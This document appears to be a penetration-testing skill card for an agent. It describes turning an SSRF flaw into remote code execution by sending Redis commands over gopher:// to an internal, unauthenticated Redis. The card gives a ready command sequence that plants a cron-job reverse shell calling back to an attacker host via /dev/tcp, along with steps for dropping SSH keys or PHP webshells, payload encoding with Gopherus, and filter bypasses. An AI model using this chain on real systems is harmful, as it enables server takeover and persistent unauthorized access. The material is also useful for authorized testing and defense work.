---
name: web-ssrf-gopher-redis-rce
description: >
  Turn a server-side request (SSRF) into RCE by speaking the Redis protocol over gopher://
  to an internal, unauthenticated Redis — write a cron job, an SSH key, or a webshell.
  Load when: SSRF is confirmed (URL fetch, webhook, PDF/URL preview, image proxy) AND an
  internal Redis/6379 (or similar line-protocol service) is reachable. Authorized targets only.
domain: web
type: technique
stability: learning
modes: [pentest, bugbounty]
severity: critical
owasp: [A10:2021-SSRF]
cwe: [CWE-918]
mitre: [T1190]
schema_version: 1
---

# SSRF → internal Redis → RCE via gopher://

## When it applies
- You have a confirmed **SSRF**: the app fetches a URL you control (webhook, "import from
  URL", link preview, avatar-by-URL, headless PDF, XXE-to-SSRF), and it will follow
  `gopher://` (curl-backed fetchers commonly do).
- An **internal Redis** is reachable from the app host (`127.0.0.1:6379` or a Docker
  service) and is **unauthenticated** (default) or you know the password.

## Why it works
Redis speaks a simple newline/inline text protocol. `gopher://` lets you send **arbitrary
raw bytes** to a TCP port, so you can pipeline real Redis commands through the SSRF.
Redis can write files (`CONFIG SET dir` + `dbfilename` + `SAVE`), so you overwrite a file
that gets executed: a cron job, `~/.ssh/authorized_keys`, or a web-root PHP file.

## Method
1. **Confirm SSRF reaches Redis**: point the SSRF at `gopher://127.0.0.1:6379/_PING` and look
   for `+PONG` behaviour / no error (or a timing/response difference).
2. **Pick a write primitive** based on what the Redis user can write:
   - **Cron** (Redis running as root, Debian/Ubuntu): write to `/var/spool/cron/crontabs/root`
     or `/etc/cron.d/x` a reverse-shell line.
   - **SSH key**: write your pubkey to a user's `~/.ssh/authorized_keys` (`dir=/root/.ssh`,
     `dbfilename=authorized_keys`).
   - **Webshell**: if you know the web root, `dir=/var/www/html`, `dbfilename=shell.php`.
3. **Build the Redis command sequence** (example — cron reverse shell):
   ```
   flushall
   set x "\n\n*/1 * * * * root bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'\n\n"
   config set dir /etc/cron.d
   config set dbfilename runme
   save
   ```
4. **Encode to a gopher URL**: each command as a CRLF-terminated line, URL-encode
   (`%0D%0A` between commands), prefix `gopher://127.0.0.1:6379/_`. Use **Gopherus**
   (`gopherus --exploit redis`) to generate the payload correctly — hand-encoding is error-prone.
5. Deliver the gopher URL through the SSRF sink; start your listener; wait for cron (≤60s) or
   use the SSH key / webshell immediately.

## Tools
- **Gopherus** — auto-builds gopher payloads for redis/mysql/postgres/fastcgi/smtp. Fastest, correct encoding.
- `redis-cli` (to understand the commands first), `nc -lvnp <port>` listener, `ssh-keygen` for the key path.

## Gotchas
- **Newlines matter**: pad the cron value with leading/trailing `\n` so Redis's RDB dump
  garbage doesn't break the crontab line. Cron also requires a trailing newline and (in
  `/etc/cron.d` / crontabs/root) the `root` user field.
- Redis ≥ some builds run as `redis` user, not root → cron-as-root fails; fall back to an
  SSH key for the `redis` user or a webshell in a writable web root.
- **Protected mode / auth**: newer Redis binds localhost & may need `AUTH <pass>`; if
  reachable only via SSRF from localhost it's usually exploitable.
- If `gopher://` is filtered, try `dict://` for single commands, or FastCGI via gopher for PHP-FPM RCE.

## Verify success
`gopher://…/_PING` behaviour differs from a closed port; after `SAVE`, your listener
catches a shell (cron) or the SSH key logs in. `CONFIG GET dir` echoing your path confirms
the write target was accepted.

## Learned on
Reference technique (common SSRF-chain pattern). Capture the target-specific SSRF sink and the
exact writable path in your engagement notes when you use it.
